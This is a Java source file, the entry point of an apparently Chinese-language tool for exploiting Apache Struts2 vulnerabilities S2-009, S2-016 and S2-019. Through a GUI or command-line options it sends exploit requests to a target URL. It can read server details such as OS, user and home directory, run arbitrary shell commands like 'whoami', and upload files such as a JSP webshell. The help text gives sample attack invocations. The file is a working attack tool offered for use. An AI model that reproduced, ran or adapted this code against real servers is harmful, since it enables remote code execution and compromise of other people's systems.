package org.vit.main;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Map.Entry;

import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.SwingUtilities;
import javax.swing.UIManager;

import org.jvnet.substance.SubstanceLookAndFeel;
import org.jvnet.substance.border.StandardBorderPainter;
import org.jvnet.substance.button.ClassicButtonShaper;
import org.jvnet.substance.painter.StandardGradientPainter;
import org.jvnet.substance.skin.BusinessSkin;
import org.jvnet.substance.theme.SubstanceTerracottaTheme;
import org.jvnet.substance.watermark.SubstanceBubblesWatermark;
import org.vit.model.MyHttpURL;
import org.vit.model.MyHttpsURL;
import org.vit.model.MyURL;
import org.vit.service.ExploitService;
import org.vit.service.impl.Struts2_S016_ExploitServiceImpl;
import org.vit.service.impl.Struts2_S019_ExploitServiceImpl;
import org.vit.service.impl.Struts2_S09_ExploitServiceImpl;
import org.vit.ui.MainPanel;

public class AppMain {
	public static void main(String[] args) {
		
		if (args.length<1) {
			try {
				UIManager.setLookAndFeel(new SubstanceLookAndFeel());
				JFrame.setDefaultLookAndFeelDecorated(true);
				JDialog.setDefaultLookAndFeelDecorated(true);
				SubstanceLookAndFeel.setCurrentTheme(new SubstanceTerracottaTheme());
				SubstanceLookAndFeel.setSkin(new BusinessSkin());
				SubstanceLookAndFeel.setCurrentButtonShaper(new ClassicButtonShaper());
				SubstanceLookAndFeel.setCurrentWatermark(new SubstanceBubblesWatermark());
				SubstanceLookAndFeel.setCurrentBorderPainter(new StandardBorderPainter());
				SubstanceLookAndFeel.setCurrentGradientPainter(new StandardGradientPainter());
			} catch (Exception e) {
				e.printStackTrace();
			}
			SwingUtilities.invokeLater(new Runnable() {
				public void run() {
					new MainPanel();
				}
			});
		}else {
			
			if (args[0].equals("-x")&args.length<3) {
				System.out.println("useage:-x url -v <verion> -m <menu>");
				System.out.println("用法：");
				System.out.println("\t<version> [s09|s016|s019]");
				System.out.println("\t<menu> [INFO(获取服务器信息)|CMD(执行命令)|UPLOAD(上传文件)]");
				System.out.println("\t-x http://localhost:8080/struts/login.action -v s016 -m INFO");
				System.out.println("\t-x http://localhost:8080/struts/login.action -v s016 -m CMD whoami");
				System.out.println("\t-x http://localhost:8080/struts/login.action -v s016 -m UPLOAD -name temp.jsp -path d:\\x.txt");
			}else if (args.length<2) {
				System.out.println("输入-x查看帮助");
			}
			
			if (args.length>3) {
				
				String longText="";
				for (int i = 0; i < args.length; i++) {
					longText+=args[i]+" ";
				}
				
				ExploitService service=null;
				MyURL targetURL=null;
				
				int tabV=longText.indexOf("-v");
				int tabM=longText.indexOf("-m");
				
				if (tabV==-1||tabM==-1) {
					System.out.println("输入-x查看帮助");
					return;
				}
				
				String target=longText.substring(2,tabV).trim();
				String v=longText.substring(tabV+2,tabM).trim();
				String m=longText.substring(tabM+2).trim();
				
				if (m.indexOf(" ")!=-1) {
					m=m.substring(0,m.indexOf(" ")).trim();
				}
				
				if (target.contains("http://")) {
					targetURL=new MyHttpURL(target);
				}else if(target.contains("https://")){
					targetURL=new MyHttpsURL(target);
				}else {
					System.out.println("请检查输入的URL是否正确");
					return;
				}
				
				if (v.equals("s09")) {
					service=new Struts2_S09_ExploitServiceImpl();
				}
				
				if (v.equals("s016")) {
					service=new Struts2_S016_ExploitServiceImpl();
				}
				
				if (v.equals("s019")) {
					service=new Struts2_S019_ExploitServiceImpl();
				}
				
				if (m.equals("INFO")) {
					String content="";
					String error="";
					try {
						String temp="";
						temp=service.getRealPath(targetURL)+"\r\n";
						if (temp.length()<150) {
							content=temp;
						}else {
							content=temp.substring(0,150);
						}
					} catch (Exception e) {
						error+=e.getMessage();
					}
					
					try {
						Map<String, String>properties=new LinkedHashMap<String,String>();
						properties.put("\u64cd\u4f5c\u7cfb\u7edf\uff1a", "os.name");
						properties.put("\u5f53\u524d\u7528\u6237\uff1a", "user.name");
						properties.put("\u5f53\u524d\u7528\u6237\u76ee\u5f55\uff1a", "user.home");
						properties.put("\u004a\u0052\u0045\u76ee\u5f55\uff1a", "java.home");
						
						Map<String, String>map= service.getServerInfo(targetURL,properties);
						for (Entry<String,String> entry:map.entrySet()) {
							String temp=entry.getValue();
							if (temp.length()<150) {
								content+=entry.getKey()+temp+"\r\n";
							}else {
								content+=entry.getKey()+temp.substring(0,150)+"\r\n";
							}
						}
					} catch (Exception e) {
						error+=e.toString();
					}
					
					if (error.length()>0) {
						System.out.println(content+"获取服务器信息错误:"+error);
					}else {
						System.out.println(content);
					}
				}else if (m.equals("CMD")) {
					
					int cmdLocation=longText.indexOf("CMD");
					String shell=longText.substring(cmdLocation+4,longText.length());
					
					if (shell.length()>0) {
						try {
							System.out.println(service.doExecutCMD(targetURL, shell));
						}catch (Exception e) {
							System.out.println("命令执行错误："+e.toString());
						}
					}else {
						System.out.println("命令不能为空");
					}
				}else if (m.equals("UPLOAD")) {
					
					if (!longText.contains("-name")||!longText.contains("-path")) {
						System.out.println("参数输入不正确。请输入-x查看帮助");
						return;
					}
					
					int nameLocation=longText.indexOf("-name");
					int pathLocation=longText.indexOf("-path");
					
					String fileName=longText.substring(nameLocation+5,pathLocation).trim();
					String path=longText.substring(pathLocation+5,longText.length()).trim();
					
					if (fileName.length()<1) {
						System.out.println("目标文件名不能为空");
						return ;
					}
					
					if (path.length()<1) {
						System.out.println("文件路径不能为空");
						return ;
					}
					
					if (fileName.length()>0&&path.length()>0) {
						File file=new File(path);
						String content="";
						
						try {
							BufferedReader reader=new BufferedReader(new InputStreamReader(new FileInputStream(file)));
							
							while (reader.ready()) {
								content+=reader.readLine()+"\n";
							}
							String msg =service.doUplaod(targetURL, fileName, content);
							if (msg.equals("ok")||msg.equals("oknull")) {
								System.out.println("恭喜你，文件上传成功！");
							}else {
								System.out.println("对不起，文件上传失败！");
							}
						} catch (Exception e) {
							System.out.println("对不起，文件上传有异常！");
							System.out.println("错误信息:"+e.toString());
						}
					}
					
				}else {
					System.out.println("参数输入不正确。请输入-x查看帮助");
				}
			}
			
		}
	}
}
